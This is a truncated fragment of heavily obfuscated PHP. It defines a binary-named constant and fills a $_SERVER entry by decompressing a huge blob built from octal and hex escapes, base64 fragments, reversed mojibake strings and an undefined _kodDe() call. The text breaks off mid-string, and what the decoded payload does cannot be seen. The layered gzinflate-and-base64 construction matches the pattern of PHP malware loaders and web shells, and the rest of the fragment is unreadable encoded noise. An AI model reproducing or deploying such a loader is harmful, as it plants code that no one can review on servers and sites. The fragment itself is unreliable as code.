return $result; } } define("\277\360\332\211\261\226", base64_decode('xaCqkan4')); $_SERVER[¿ğÚ‰±–] = explode(base64_decode('fAN8A3wC'), gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\275\11\174\133\305\265\60\16\205\26\102\241\245\55\17\322\7\224\33\103\260\235\150\261\235\335\211\23\144\133\216\105\144\313\110\162\26\154\107\271\226"."\xae\xa4\x6b\x4b\xba\xf2\xbd\x57\x5e\x12\x87\x42\x28\x4b\x21\x21\xec\x6b\xd8\x4a\x3\x14\x8\xa1\xac\xa1\xac\x8f\xe5\xf1\xa\x5d\xe0\x15\xa\xb4\x8f\xb2\xda\x9\xf\x28\x5\x1e\x3b\x85\xff\x2c\x67\x96\x7b\x25"."\303\373\377\276\357\367\373\2\211\146\71\63\167\346\314\231\63\147\316\234\71\363\247\307\176\377\376\253\377\71\276\17\372\357\133\217\235\173\357\345\223\267\323\60\371\157\37\32\76\352\354\375"."\367\42\177\176\164\366\131\65\65\355\363\17\230\335\171\340\326\73\167\250\337\152\236\374\344\261\73\177\267\355\331\127\176\167\123\74\265\364\67\333\62\77\331\353\371\57\132\163\215\10\224\226"."\154\244\77\112\301\260\25\155\124\267\154\213\46\44\215\102\132\317\320\260\136\240\277\176\372\323\35\15\233\132\336\260\65\32\365\321\237\4\264\212\374\153\15\345\164\226\237\350\214\304\23\261"."\xee\xae\xae\x60\x34\xe\x40\x8d\x72\x7e\xde\x48\x41\xa8\xa8\x9a\x6a\x1e\xbe\x5f\xd4\x4c\xb\xb5\x46\xae\x2e\x51\x34\x8a\x5a\xc1\x91\x22\x12\x52\xaa\xad\xf6\xab\x16\xd4\xd4\xda\x9c\x68\xd\x76\x85\x23\x6b\x12"."\xf1\x35\x5d\x41\x80\xe8\x4f\xc\x95\x34\x73\x8c\xc6\x48\x30\x66\xab\xa6\x1d\xd7\xf3\x1a\x87\x18\x31\x79\xbb\x9a\x83\xcb\x43\x9d\x4a\x3c\x1a\xe8\x8c\x5\x5a\xe2\xa1\x48\x27\x4d\x6e\x89\x74\x74\x84\xe2\xe5\xe9"."\xd1\x48\x38\xdc\x1c\x68\x59\x51\x9e\xd3\x15\xd\x2c\xef\x8\x28\xa8\x7d\x39\x2d\xa1\x17\xd2\x46\x8d\xb2\x8e\xe6\xac\x53\x6a\x69\xa0\x4d\xd7\x72\x29\x1a\x2c\xa8\xac\x39\xf6\x58\x11\x42\x71\x1e\x42\xc3\x54\x28"."\345\162\64\322\311\103\51\55\255\226\162\200\255\126\71\122\64\365\274\312\72\275\102\33\343\251\64\240\226\154\103\57\44\151\44\70\152\233\252\110\107\155\115\242\201\326\12\120\125\54\30\16".base64_decode('tsQV3EClLRrpUGAQ8qpla6ayqj0YDSq40U3VpK/VCtBLJ0KFEgiHlalqsLV8kVVDy1SoLA==')."\22\155\15\106\225\346\65\212\300\120\322\310\347\215\202\17\325\202\106\322\226\232\32\214\106\151\300\3\344\35\16\341\101\203\110\244\255\55\26\344\61\350\334\11\141\324\222\71\100\237\216\130"."\52\235\263\23\303\152\256\304\310\164\220\376\126\303\17\374\32\26\220\356\220\136\320\113\100\246\120\205\141\360\151\5\201\22\203\326\130\212\226\202\100\36\225\67\240\134\77\244\365\63\250\1"."\26\320\321\14\35\246\301\246\245\364\167\61\224\357\117\340\74\315\264\23\132\41\151\244\364\2\314\343\145\100\217\252\235\155\65\165\4\100\343\151\43\227\142\141\113\137\17\275\114\353\71\255"."\xb3\x94\x97\x41\x78\x34\x99\xd5\x73\x29\x93\x4d\xbd\xaf\x83\xa4\xd1\x30\x9f\xc9\x18\x56\xc4\x8a\xa8\x25\xe3\x8c\x9\xe8\xe9\x31\x31\x15\x31\x5c\x17\xcf\xb5\x8c\x92\x99\xd4\x42\x68\xea\xd0\x78\x3d\x24\x6b\xb6".base64_decode('jTrHEGJ0F3OGmoppJu+abrShiiIlW04sEbA2w8y3IqYB30cTRu+ukDHIpkxKwpi/pucU7w==')."\227\175\75\307\241\177\152\201\53\366\102\233\262\132\56\227\320\106\65\230\123\371\324\74\213\41\303\157\365\353\5\77\112\241\321\120\44\221\125\255\154\107\152\136\202\224\202\46\27\122\332\250"."\257\230\55\322\250\230\355\275\16\232\307\250\353\64\354\240\304\262\163\106\122\315\311\135\244\341\254\155\27\143\132\41\205\61\1\135\61\106\12\4\123\105\115\3\240\126\217\222\122\72\224\65"."\x4a\x7b\xa3\xde\x68\xb1\x82\xf9\x1c\xf\xb1\xde\xf1\x34\x8b\x27\xda\xa3\x6c\x38\x53\x69\xa0\x56\xb6\x62\x54\xc1\x7\x75\x8b\x30\x3f\x31\x73\xd5\x62\x31\xa7\x27\x55\x5b\x37\xa\x7e\x23\x69\x6b\xb6\xd7\xb2\x4d"."\115\205\32\3\311\244\146\131\336\26\243\140\233\106\316\33\310\345\214\21\157\304\324\63\172\241\121\231\105\141\160\46\232\357\136\314\33\33\141\22\127\55\126\60\341\340\317\314\152\52\331\151"."\xef\x42\x36\x39\x39\xb4\xa9\x16\xac\xb4\x66\x7a\x83\x30\x33\x1a\x15\xd4\x58\xce\x20\x19\x58\xab\x6e\x15\xd\x4b\xc7\xcd\x6b\x54\x54\xdb\x56\x93\x59\xcc\x5c\x44\xf5\x4d\x5f\x3\xaf\x17\x72\x7a\x41\x2b\x87\x45".base64_decode('lWjeLlPN5NVGpVjqRwiACQlpSQwhAwMCGpW8OupVM6ym4GhRNzWL9VpZ3hEHikp7O/BE0g==')."\265\224\67\206\270\67\124\66\247\156\256\202\150\105\141\171\64\265\75\36\357\112\204\332\320\362\334\31\114\164\4\342\55\355\120\273\255\146\130\325\141\304\223\171\225\54\161\265\27\115\50\114"."\115\235\250\163\42\261\313\30\321\114\364\341\346\261\106\145\320\110\365\33\243\76\226\205\201\143\210\263\60\140\74\276\105\333\33\125\13\31\334\215\376\61\133\3\232\23\274\251\31\55\346\276"."\64\235\275\276\176\55\155\230\320\33\153\70\343\104\176\130\53\144\354\54\253\73\26\214\256\14\106\23\261\110\133\174\125\40\12\153\177\1\121\316\50\153\15\376\172\316\33\325\122\10\211\111"."\233\225\123\213\2\373\253\275\170\302\340\217\263\134\74\211\130\136\70\264\34\343\256\325\153\41\40\257\14\305\352\16\353\171\35\167\317\346\71\4\331\110\60\130\16\15\362\223\76\67\365\132"."\263\152\172\123\263\153\275\350\337\131\265\75\275\255\276\131\175\313\374\272\50\343\257\367\325\53\15\165\363\225\56\44\251\350\152\116\201\116\227\101\324\51\221\25\116\264\10\12\57\30\5\255"."\xe2\xc4\x42\x84\x64\x58\x9a\xb7\x5d\x53\x11\x93\x46\x3\xe1\x18\x17\xf\xfb\x16\x8d\x7f\xd\x76\xf1\x5a\x29\xf1\x12\xd7\xb8\xd0\xc4\x68\xf0\x84\xee\x60\x2c\x9e\xe8\x8\xc6\xdb\x23\xad\xd0\xfc\x60\x0\x42\x5".base64_decode('VJi0l40xFsxoEOEYAqPSGiLWgqSMEFKu0xgZB+7vIqCWrJYcnCIPhaA3BuVLbOh66E8fUA==')."\163\37\375\111\350\126\233\264\156\342\50\347\257\11\243\177\0\121\126\207\306\26\21\370\122\50\217\346\260\150\171\302\271\310\261\156\165\10\112\107\123\146\225\236\342\253\40\212\266\153\172\46"."\xb\xd\xd5\x71\x75\x49\x23\x67\x98\x6a\xe\xf3\x7e\x26\xb8\x66\x74\x60\xc3\xc5\x5c\x9\xd1\xbd\x1f\x57\x1c\xcf\x96\xf2\xfd\xb0\x52\x21\x1c\x65\x34\x5b\xc8\x94\xd6\x18\x12\xbc\x80\xf3\x22\x11\x1c\x21\x33\x4".base64_decode('wwLrLsT8CUyrvb5iIVN7DNSVaJhXhxNgGKFnSLguaeVd9yUNNLE71EGtEfcFuNliksoiEg==')."\303\134\214\327\270\46\67\137\300\303\223\363\345\121\45\244\316\26\203\257\312\164\373\2\102\20\133\343\24\315\64\15\163\6\100\220\260\102\26\112\74\134\120\271\315\305\16\13\261\0\26\316"."\x1a\x5c\x4c\x31\x18\x31\x36\xfa\xa1\xdf\x33\x1b\xda\x80\x6d\xa4\x90\xb8\xe6\xb3\x6c\x34\x8\xa8\x83\x6a\x2a\x55\x29\x19\xb1\x1a\xa8\x60\x9c\xd1\x29\xc9\x18\x7\x39\xc0\x1f\x9b\x83\xfe\x17\x8b\x7e\xca\xc8\xab"."\154\11\45\213\237\226\242\253\237\43\211\116\133\232\64\213\325\153\332\6\316\64\35\220\210\22\263\6\264\14\15\75\364\252\304\273\307\72\232\322\162\32\243\242\254\306\4\210\72\0\103\350"."\347\64\226\346\304\216\266\10\50\125\110\156\272\25\105\45\361\162\317\342\253\360\236\112\44\140\231\7\210\107\4\163\150\350\42\144\326\210\170\227\251\245\165\340\332\5\64\373\73\124\163\220"."\165\14\225\24\363\15\107\244\271\330\326\35\16\47\132\42\235\161\264\45\243\51\253\242\241\70\360\252\50\342\71\211\100\113\27\304\4\147\343\142\231\54\130\320\224\341\6\240\23\324\10\277".strrev('p|R˜`…å*{–3Å96òğóæ÷¯Ï¥h	Ép¨B @JVY['."\r".'Šòˆ'."\n".'4\\Ğ€').strrev('¬e¥ÑUëêo%á-ŒU`w'."\n".'¬ª '."\0".'ñ!–D‰yY'."\r".'ÕÖùó÷›$Tá–$WarfDĞò0').base64_decode('Pawj+ZwQ9Z298oqRL1leDUsZ4gtzve0dgRZvrD3QMG8+TV2TT/XG23Wr90QeBzSOWHMTpg==')."\x86\x18\xe\xfb\x50\x43\x1d\xd4\xa4\x61\x29\x49\x6a\xde\x1a\x6f\xde\x8b\x6b\xc1\x18\xf4\xd5\xd5\xd5\xb1\xba\x66\xcf\x57\xb2\x88\xcf\x8d\xb3\xd5\x24\x45\x46\x9\x70\xd7\x5f\x4a\xe\xb2\x9\xa3\x26\x99\xe8\x8b".base64_decode('VxnLO6IzznwM3yUcU049xzjXQ6iiRFbihJrEH0ugGu2SJWMKTasUKqQziZ6mqrkMQrqdzQ==')."\xcb\x89\x62\xe0\x69\x5c\xa3\xe2\x21\x1f\x3b\x8e\x45\x8c\x5b\x27\x8d\xcb\x4d\x2a\x1a\x48\x20\x85\x6e\xac\xae\xd8\x86\xd5\x95\xda\xb0\xda\xd5\x86\xd5\xe5\x6d\xa0\x49\x96\x9e\x29\xa0\x5e\xb2\xc5\xd\x86\x63\x39".base64_decode('Hg5pWB3DPJpABRMwhxJyVwBJ0A05p51zM9bJjtZ5rB2BjhO9rQHGC5YsQySqDGNNk1Foqg==').strrev('.8°«Œ4aŸH±›,Ç¦¸£tB"Màv1˜‹äbÒXKe‡ûCoİTÜÇl+UÕ÷®')."\xf1\xcb\x70\x4b\xfc\x53\xd5\xa\xc4\x96\x57\xd7\x1b\x5\x44\xde\x68\xd1\xcc\xfb\x92\x40\xc3\x58\xc\xe5\x6b\x10\x8e\x58\x3c\x16\x6f\xf\x75\xae\x48\x74\x44\x5a\x83\xe1\x44\xa8\x13\xc9\x69\xf1\xf2\xf4\xee\x2e".base64_decode('0Xk5vTkSb3ekdiNJbWUgHHKDB1eHYvFYxSyU1h105bQ2J7qiwbbQah5tCwXDrbFES6ClXQ==').base64_decode('wHQGOiCCRCItl7L8TvgEEjljXJ2WgAGDmEODlWC6mYTgxWj7ogEBQ3exQpL0JMEmfYkLkA==')."\154\257\236\147\213\55\332\172\301\210\260\175\107\15\375\251\125\2\61\305\56\102\35\150\131\355\37\343\101\322\15\26\107\302\6\174\137\1\361\267\254\5\11\14\323\54\155\162\52\47\4\322"."\x36\x17\x38\x5d\x71\xb4\x88\x88\x3c\x34\x2\x1\xa2\xf9\x44\x94\x40\x46\x4\x3e\xa3\xa3\x25\xc9\xb4\x3\xac\x39\x69\xa1\x75\x4c\x44\xba\x82\xd1\x0\xd6\x59\x26\x56\x45\x23\x9d\xcb\xa1\xc0\x48\x56\x63\xd\x8"."\1\372\153\330\256\23\124\227\266\130\331\325\234\256\302\224\317\13\244\17\30\14\225\307\322\37\264\341\146\42\175\201\241\273\37\113\67\114\256\145\201\64\232\17\114\62\61\112\374\63\375\206"."\x1\x55\xe7\xf0\x3e\x6b\x9c\xad\xb8\x5c\xe7\x39\x60\x31\xea\x18\x65\x6b\xf5\xec\x71\xb6\x26\x0\xcd\x46\x56\x4\x3b\x13\x8c\xa4\x68\x4c\x22\x43\x9a\x10\x8c\x46\x23\x51\xc0\x84\x6d\xc\x32\x7d\x17\xcd\x8c\x6"."\x63\x6c\x99\xc4\xeb\x8f\xce\xf0\xe4\xf7\xcd\x6\xf2\xd5\x90\x10\x7\x9f\xf7\xaf\xed\x1d\x99\x5d\xd3\xe3\x9d\xed\xeb\x43\x81\xda\x59\xc7\xd1\x28\xc4\x7a\x7d\x8e\x28\x93\xad\x4b\x26\x2f\x8d\xa7\x7a\x8d\xb5\xac".base64_decode('trHX3+uvWdbYE/CuV73r67yLvH1IIq+dDQl9Gxo8czdiAAS47Og+9NPUu2xmr/fYk9Yd1w==').base64_decode('09tX3Th7Rq/v6N6Rvlm1y9h3kiUTCf2M9aOmpmbXoCahbSkHKUgcjQCwjPV6UaRumL+RpQ==')."\xa3\x31\xd4\x32\xa2\x44\x8f\xb7\x77\x76\xdf\x32\xa9\x9c\x94\xe4\xfe\x16\x5a\x92\x90\x0\x93\xe5\x70\x1\xef\x89\xb8\x67\xbc\x28\x9e\xf0\x40\x1f\xa5\x42\x52\xac\xef\x78\x42\xf4\xab\x7c\x7f\x97\x29\x88\x7d\x94"."\155\162\35\350\60\42\122\261\130\155\230\111\177\67\262\201\314\150\60\333\311\371\207\11\324\131\52\350\103\154\103\123\320\206\40\140\330\214\260\373\65\173\104\143\344\201\322\35\161\104\34\154"._kodDe('Kjn1Rk0bILIhTThduQeIUofUQNGxg/zplboMDl1PNKk9uZwSmAYaNOUsZ1SM+aAkTAd/zGo=')."\xcc\x4f\x4a\x50\xd7\x4\x2b\x65\x8c\x41\x52\x44\x11\xc5\x10\x4c\x79\x6b\x28\xa7\x10\x8e\x40\x37\x55\x8d\xe4\xd0\xc8\x2a\x15\xf1\xfe\x48\x41\x23\x8e\x70\xab\x20\x49\x48\x69\x5a\xaa\x50\x94\x43\xb9\x84\x3c\x0".strrev('ñÂ H°ş‹ßÄ¶™k9†ßtŞ«ázú¥£Ô··¦¿M°’ÚB1EM šÌzLMLšÁï¾E').base64_decode('RYKzwQQScH24HVxN7YjwbBo1TL6zKDr277ZhqzlHFXGcAoPLJV9Q2NLRDguOhWVh6dyH8A==')."\321\116\256\40\345\22\245\164\360\200\113\304\64\333\307\41\74\122\146\2\305\35\147\160\115\240\174\115\353\5\64\235\132\244\65\216\252\315\143\144\333\357\70\54\262\64\325\114\146\333\112\271"."\x9c\xcd\xb5\x2d\x39\x7d\x10\xbe\x0\x73\x5\xce\xae\xbc\xf4\x47\x99\x5d\xa9\x68\x9b\x61\x32\xe5\xe3\x2c\x68\x46\xd5\xac\x4a\x80\xa1\x42\xc1\x48\xf5\xcb\xa4\x26\x56\xd7\xe5\x1\x24\xc7\xc4\x95\x1a\x76\xce\xa2".strrev('äNÍpH£v€è2ö®õeêÔ\'èá‹X^­'."\0".'W`±	I‡!x*t$Hæ•:„').base64_decode('xjycWhC8N/NgXYQHCxUe1GoPVl94xM7XI44vPMO6NkICfFfqgc2qRyheIBhq9ehWK9l0kw==')."\17\220\54\326\4\73\213\265\312\71\165\314\103\233\23\326\206\265\234\207\251\144\74\254\215\36\246\210\362\20\5\122\53\64\253\33\115\47\150\26\11\42\256\231\365\140\2\302\364\353\21\7".strrev('or³¢*O6 ¹+#Ën˜{a†¢ÌÚ Y´b”ßbìT£Ld÷—±ëö#™ ¤c*').base64_decode('CP7djQD6wlnlWPqGwSofD6d+bwOtEZSZG9kq54AhejYudmKEi9BKMVFxB9pUOLqj1cphTg==').base64_decode('oAUnoYqzE3FqJoRctxbGfZ6GP4p2IjHpc7aaYd/CzIrvUyqA0nBUS44lhVqnVVIWOWMlVA==').strrev('1ËkQhc†ÌXÚ„(¤`XEú³Íò9¾>v#1Ãm0ù®œÆ<¨Ò¨ó!åº»MLC')."\xa4\x34\xc8\xd9\xc0\x80\x3d\xce\x18\x9e\x5c\x3e\xc2\x90\xc9\x9\x75\x8c\x2b\xd\xc3\xc1\xb6\xb8\x72\x7c\x4\x71\x2f\xdd\x48\xd0\x32\x9\xc\xac\x90\x7f\x8c\x82\xe2\xa8\x9b\xa1\x4b\x69\x22\xf9\x22\xae\x16\x52"."\x34\x65\x1d\xe2\xf4\xeb\x9a\xaa\xd8\x47\xaa\x1c\xc5\x5\x99\x38\x1b\xe1\x61\x51\xc7\xd7\xc4\x88\xcb\x48\xc0\xe4\x40\xba\x2f\x56\x27\x96\x14\x11\x8b\x61\x9\x24\x3f\xd5\x4a\xd2\x0\x56\xb9\x42\x48\x63\x69\x62".strrev('Ôîæ÷˜…éŒ/K¨£%®‘EÜ¢u‡f+Å,ÁVD@à¡$bœÅG|rí`HØ”ºeh')."\161\276\12\13\41\0\117\156\21\243\124\71\125\230\56\42\130\365\105\353\367\300\361\257\47\247\27\6\245\5\132\150\66\121\353\161\121\251\355\120\223\253\345\120\221\4\42\60\0\363\31\50"."\x3e\xab\x9a\x2\x99\x8c\xb\x61\x56\xc0\xfb\x60\x61\x10\x11\x95\xc0\xd2\xea\xb0\x10\x50\x1c\x65\x24\x5e\x62\xd9\x63\xac\xf5\x72\xd0\x59\x29\x8d\xb6\x7a\xc8\x6f\x3b\x6a\xbc\x3c\x5d\xf9\xf0\x60\x3e\xc2\x80\x28".strrev('N@g'."\0".']$$L  c'."\r".'xF'."\0".'‰^'."\0".'³…o”¾èÄdÖ-Æ]Ñîë†âGH~…pŒ ¼B').base64_decode('cYC2JMDZO5LXc2g1M314jizHaxLDCWVvMs3FNNRPqF7UECvLk6GFDhWze7E88AMwPsUEfg==')."\305\174\312\210\6\141\164\46\312\333\201\51\270\162\274\315\64\270\160\313\127\166\67\120\13\331\75\162\203\16\327\152\54\341\303\41\101\224\45\111\145\334\262\204\53\325\25\305\362\205\153\132"."\13\36\310\224\143\364\70\306\244\13\230\17\355\11\300\76\307\123\47\211\133\202\317\154\240\107\142\260\340\155\164\215\263\155\30\150\243\151\372\114\364\145\321\40\211\307\1\203\40\66\32\170"."\x1d\x94\x85\x4\x5e\x8b\x85\x32\x24\x6e\xed\x94\x85\x58\xc9\x58\x51\x65\x4c\x9a\xcb\x69\x8c\x7a\xc9\xae\xa2\x24\x18\x27\x69\xb2\x68\xf\x6f\x5\xcd\x8\x73\xe1\x16\xb3\x87\x60\x4a\xb7\x71\xa\x9e\x6f\x6\x3b"."\x7\x12\x80\x62\x85\x74\x17\x16\x71\x99\x65\x93\x95\xa7\x6c\xec\xc5\xce\xc1\x33\xd3\x1\xe9\x94\x16\x20\x71\x16\x59\xd2\x7d\x42\xb8\xa9\x6c\x96\x94\x34\x8a\x40\x10\x92\xa9\x5e\xde\x18\xd6\xa4\x44\x7c\xee\x56"."\24\71\122\224\146\113\131\242\122\11\212\217\21\151\21\232\136\51\42\22\13\54\20\130\50\113\366\323\164\6\373\360\16\302\47\260\34\152\15\230\46\243\137\332\115\174\46\214\22\345\44\314".base64_decode('/mJs8lVarmjlwWFhiEerwh/20dmPDx4j7JBfDpeDykrFyhXFxOG7M1YZPJDLCXMpd3zKIg==')."\164\326\313\205\344\224\51\213\265\221\315\54\263\64\250\224\306\267\61\123\213\346\356\3\160\47\247\236\132\144\141\163\323\275\343\340\303\130\71\216\26\347\226\254\136\320\230\312\45\255\233\126"."\x25\x96\xf5\xff\x58\x36\x2e\xc7\x3c\x9e\x21\x53\x91\xb\xce\x93\xd4\xcf\xd8\x20\x78\x58\x93\xf7\xc\x5c\xd5\x2a\x58\x14\x5f\xb5\xc7\xdd\xb2\x8\xc8\x3\x52\x24\x61\x3b\x44\xaa\x28\xa9\x5f\x9a\x4e\xe\xa\x41"."\xd3\x97\xe2\x3\xaf\x58\xa1\x88\xcf\x9a\x82\x66\xdd\x70\xdc\xb6\x84\xf0\xc4\x51\xbe\xd0\xca\x85\x70\x16\x1e\x4b\xb9\x52\x21\xc2\x7d\xd\x3c\xaf\x5c\x88\x73\x32\x1c\xa2\x5d\x9c\x31\x55\x5b\x59\x36\xaf\xe5\xec"."\x3f\x3d\x7e\xde\x2b\xf7\xd2\xf0\xe4\x6b\xdb\x5f\x9b\x7c\x9e\x86\xe7\xd5\xc3\xc1\xd7\xf8\xbe\xe8\xbf\xbd\x69\x58\xd8\x83\x9f\xb6\x7a\xcc\x38\xfc\x89\x7f\x59\x7e\xca\x49\x7\x57\xdf\x3d\x2d\x78\x90\xbe\xf6\xf6"."\307\256\367\205\337\73\267\346\204\373\147\176\232\275\177\372\337\377\160\376\340\37\376\356\311\144\202\321\17\227\265\375\365\261\117\217\16\236\365\233\343\372\356\314\156\71\64\173\312\374\341\223"."\17\235\166\371\65\57\137\337\370\276\267\361\76\353\155\137\355\366\273\137\275\162\354\203\364\344\221\17\215\34\70\347\217\17\376\361\313\223\214\237\375\343\340\153\176\262\355\263\247\257\273\154"."\xc6\xdc\xfa\x53\xc6\x1f\x5f\xb6\x3d\xbd\xf4\x6a\x6f\x7a\xc1\xc3\x7d\x9d\x7b\xdf\xfa\xd7\xf\x8e\x5c\x3a\x7c\xde\xb2\xdb\x7f\x98\xbc\xeb\xb1\xaf\xde\x7d\x6c\xfa\x70\xfd\x55\xff\xf8\xc1\xcc\x3f\x67\xf7\x9d\x76"."\xf5\x31\xb7\x3e\xb5\xd7\x5\x4f\x7e\xfb\x95\x58\xf8\x8d\xa1\xf7\xcf\x7d\x74\xed\x5\xc7\x1d\x1e\x9b\xde\xf1\xeb\x9d\x77\xff\xcf\xc0\x4b\x8f\x9e\xf8\xd3\x6b\x8e\xfc\xe8\x5f\xb7\x15\x9f\x30\xf\x5c\xf8\xc7\x5d"."\311\217\317\121\226\374\341\372\25\312\306\23\73\227\175\366\333\43\337\171\264\24\232\274\372\324\341\213\276\377\331\76\137\172\127\375\42\160\335\113\257\275\176\145\172\303\175\377\365\354\153\307".strrev('=Z¿½ş¿68X?§­ó¸<WÓR›£Çğı=›/k¥ù³Ù?O%Îr>Ï}Îù­¿ÿV1ê|¼').base64_decode('/Xsrhm5Of3KDPnZnYcb2v9euCVuPPnLxtM1Lbogv3t+jvJr+43EbN3/82DN/evXn3Zte7A==')."\xc8\x5e\x7e\xfa\xd3\x43\xaf\x9e\x90\xbd\xa7\x65\x6c\xfb\xb6\xbd\xb7\x7f\x3b\x37\xfd\xea\x55\xd7\xde\xf0\xc1\xbd\xfb\x5c\x7b\xc2\x8f\x5b\x36\x46\xff\xed\xf4\x75\xcf\x34\xf5\xf\xef\xff\xc1\x19\x9d\xa7\x3d\xfc"."\xf0\x7\xe9\x4b\xa7\x37\x1d\x35\xed\xd0\xc3\x1b\x97\x1e\x75\xd9\xa1\xef\x65\x5b\x7a\xe7\xef\xb3\xff\xbd\xeb\xf6\xbd\x62\xf5\x8c\xd6\xf3\x5f\xd8\xf2\xa3\xb3\x5e\x5a\x38\xff\xf0\xf5\xfd\x27\x9e\x77\xe8\xeb\x7f".base64_decode('6hs4eml18bHNjz3x9HcO/VdP74z96nJP/Xjztc8WHjv39Y/qrj/vkQuPe2H42rlPTD944Q==').base64_decode('w/vdtvngqw564cTc63ttbr792cvPGfE+em7PkQsXp3y3JlPtmWnRF0tHjz5hL9jrtFI4pw==')."\374\154\301\77\176\27\230\76\175\253\347\236\115\236\75\267\234\177\305\305\371\320\254\275\257\273\151\365\232\355\165\177\353\356\317\55\30\261\276\377\337\337\75\362\361\347\266\136\60\173\377\157"."\125\375\176\123\346\300\323\156\323\27\135\160\314\304\303\57\234\271\306\267\172\353\145\355\317\134\270\360\254\377\374\301\245\323\356\35\274\173\305\141\253\216\274\343\107\307\334\160\363\241\3\247"."\xdf\xbe\xcf\x7e\xdf\xbb\x63\xe8\xb9\xf7\x1f\x3e\x78\x66\xf1\x88\x5d\x8b\x9a\xf7\xb9\xa1\x7e\xbf\x57\x26\x3e\x3d\xe5\x91\x9b\xcf\xd8\xf8\x8b\x47\x97\x3e\x3b\xed\x97\x37\x5f\xb8\xf4\x97\xa7\xb4\xac\x3a\xec\xf2"."\3\116\371\342\351\367\317\14\74\261\322\327\133\325\366\137\63\156\335\204\266\170\63\222\323\176\271\352\231\317\175\117\253\277\73\157\305\143\307\56\71\245\346\221\314\121\227\326\365\336\262\350"."\74\335\176\373\322\77\267\357\377\235\332\273\266\235\220\150\175\140\332\370\205\7\137\266\65\270\151\105\356\7\163\136\71\161\306\57\366\33\255\12\34\162\336\21\301\357\276\176\376\367\37\75"."\x64\xf5\xcf\x7f\x7b\xf2\x8f\xbf\x58\xff\xeb\xe9\x6b\xaf\x3a\xf5\xe1\x57\xaf\xac\x1f\x7e\xe5\x39\x6b\x6b\xed\xaf\x1e\x3f\xed\xe2\x17\x5e\xbb\x73\xda\xa1\xa7\x2a\xab\x9e\x78\xfc\xc0\xb\x8a\x9b\xf\x3e\x76\xcf".strrev('¬œŸ-İdûOêR®;áğ÷Ü÷«³]åÒÿ:Ü»Ï¤—Új×¾ïÜ.·ÁmŸê~ïÃ„è9n7£m').base64_decode('3njLv33S6Tnye56LrlsUuG7zL07Ye9L88Jpn/vPJ36c/Xz1456J3dt2948O/vBMIP3Tbug==').base64_decode('Ga9svlifdtQVDx5Se9h7j3cdFr7si/Ef1v7w3HnLt69MePc9/3vFR/YNvbmo5erZx+6zeA==').base64_decode('+oIjYrd9Ea/x33/ROdaHPU9qLUsuqbsn/3bKftu3+t3663/82PQj/UvqbzK2/NfFv9vY8A==').base64_decode('yqr5/3rWBu3nj//w25+VDu9bcmpqw9Dv/3v6X+tqNj7v+eu5mzbu2v/ktzfutyL+25UXXw==')."\xf9\xee\xda\x9b\xd6\xee\x5c\xf9\xca\xa2\xd3\x9f\x99\xde\xf6\xb3\xf7\x5e\x7b\x2f\x70\x4d\xc3\x9a\x85\xb9\xdf\xde\xb9\xf3\xe6\x95\x81\x4f\x1a\x9b\xdb\x6f\xb3\xf7\xf9\xe1\xa6\xdf\x2e\x7e\xad\xf8\x72\x43\xea\x2f"."\xc5\xa3\xfb\x5e\xf8\xe5\x6f\x8d\x43\xf6\x9b\x68\x18\xbb\xcb\x7c\x2c\x32\xf1\xc1\x3f\x87\xbb\x17\xdf\xf4\xe1\x67\x37\xf9\x8f\x7e\xfa\x67\xad\x7f\xbb\x67\xf1\x74\xfb\xce\xb5\x3b\xd6\xbe\xf5\xdc\xfa\xe6\x4d\xf5"."\305\43\56\73\372\360\35\137\236\174\332\346\225\57\172\357\71\361\256\364\21\321\361\133\176\376\130\163\167\352\350\133\366\261\367\72\266\153\306\337\217\134\367\267\207\326\374\307\133\373\177\336"."\174\321\207\325\367\174\174\120\327\274\253\316\251\176\265\377\327\147\266\276\30\16\276\366\362\217\166\17\315\33\173\376\362\3\376\176\357\23\207\137\236\56\236\360\344\25\373\77\170\310\133\207".base64_decode('PvzApQce6fnRL09Yd9i/nDW546/jJ311feGQ9x/fctezn+14dkdN5rioljmzacD+8qnDdg==').base64_decode('//STFyeueKj3wY0nvXfD7pcfHC99+tE7n19iPNS44Z8f37F17ZU//XL32c8bvpM+/mDm0g==')."\127\37\172\342\213\127\276\377\323\271\307\214\234\164\304\75\127\37\72\66\377\332\376\157\15\175\353\250\37\357\27\75\375\203\220\167\257\266\206\25\173\2\357\176\32\76\144\356\213\173\177\147"."\x7b\xc7\xc3\x67\x5c\x33\xf8\xfb\x85\xad\xc7\x5d\xbd\xef\xd3\x2b\x4e\x3b\x23\x7e\xf4\xe7\xde\x97\xfe\xf0\x97\xdb\xeb\x8f\xfd\x73\x6d\x78\xee\xe4\xf1\x9b\xb4\xb9\xd5\xa7\xd4\xee\xea\xda\xf6\x1f\xde\xe2\x68\xcd"."\123\147\34\77\166\100\360\343\203\254\317\26\376\163\355\300\77\177\373\331\73\363\166\134\70\21\277\243\353\167\313\102\73\166\276\363\356\163\237\77\167\276\276\244\343\342\303\176\177\107\123\336".strrev('ğwœó®s²ñÿw¯ñ¿gíïF±¯e»™G}ïQçı§\'¦ğşw£ôÃs]×AïGs×ùèó').strrev('¿÷‹k•ë£ù_–…Jm¯¯ëaü_Í°êşçc¾}îùß¿Â¹şzoG˜øt{/İ|]G3\\§!')."\164\317\375\247\37\171\344\45\117\335\276\354\253\335\257\135\174\324\66\317\246\236\267\147\27\322\37\6\237\273\352\47\115\63\77\350\275\373\345\377\71\143\316\225\113\152\236\377\311\163\147\154".base64_decode('2D5329U/+fifhe2L/bl7Pu5ccPZHxd/My949+6X1Fz/7jHrxT5b9x/Z33swtfeedZ79zeQ==')."\xcf\xcd\xab\x7e\x10\x8e\xbc\x9b\xbe\xf2\x81\x97\xb6\x5c\x79\x55\x68\x43\xdf\x49\x7f\xfc\xf3\xef\x3f\xbc\x2b\xfe\xab\x13\x77\xdf\x51\xbf\xfd\x91\x1b\x3d\x5b\xb6\x6a\x17\x3c\xd2\x39\x7a\xfd\xac\xaa\xd\x93\xef"."\117\33\274\244\346\255\303\377\24\70\365\275\107\17\367\234\121\267\374\224\153\326\276\74\166\100\347\311\67\374\350\251\177\331\166\375\273\173\376\355\221\277\154\370\305\332\263\136\377\333\356\243".base64_decode('ZoT+cfC0tb3Lb3l/xeDmJQe0b/coi5PGj8y9zjyz6YK7PrtlxoxP9j3z5MM/e++cB0771Q==')."\x93\x97\xdd\xbd\xe0\x2f\xea\x7d\x99\xe3\x1a\x5e\x58\xdb\xff\x93\x7f\x9f\x18\x8a\xff\xf9\xdc\xbd\xff\xcb\xfc\x22\x78\xe0\x8e\x7b\x27\x2e\xdc\xf8\xe3\xd7\xbf\xf3\xd6\xfc\xeb\x7e\xfc\xf8\x1f\xfe\x63\xaf\xfc\x65"."\377\176\